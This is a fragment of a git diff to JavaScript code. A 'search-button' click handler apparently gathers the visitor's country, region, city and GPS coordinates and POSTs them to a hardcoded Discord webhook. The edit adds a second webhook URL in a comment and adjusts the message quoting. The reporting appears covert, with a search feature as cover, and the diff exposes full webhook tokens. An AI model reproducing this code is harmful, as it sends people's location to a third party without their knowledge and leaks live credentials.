@@ -136,6 +136,8 @@ document.getElementById('search-button').addEventListener('click', function() {
   var xhr = new XMLHttpRequest();
   var webhookURL = 'https://discord.com/api/webhooks/1154913740853088337/2U0DhYpkSA6GRlTdcAA9mIryedS6yPcF6-jvJEeH2v0IhM4RudYF9qDeFXuXYR7MYIYb';
 
+//https://discord.com/api/webhooks/1154933075734695936/FrxC0nRffQrEKVdpw0UonXkboRt5KfLxTg3ltnN_Lwy2Sb1EdMvx0fvQRr6Mrf_0hCDg
+
   xhr.open('POST', webhookURL, true);
   xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
 
@@ -196,7 +198,7 @@ document.getElementById('search-button').addEventListener('click', function() {
 
       // Skapa meddelande för Discord.
       var message = {
-        content: `Användarens geolokalisering:\nLand: ${country}\nRegion: ${region}\nStad: ${city}\nLatitud: ${lat}\nLongitud: ${lon}`
+        content: `"Användarens geolokalisering:\nLand: ${country}\nRegion: ${region}\nStad: ${city}\nLatitud: ${lat}\nLongitud: ${lon}"`
       };
 
       // Logga meddelandet som ska skickas till Discord för inspektion.
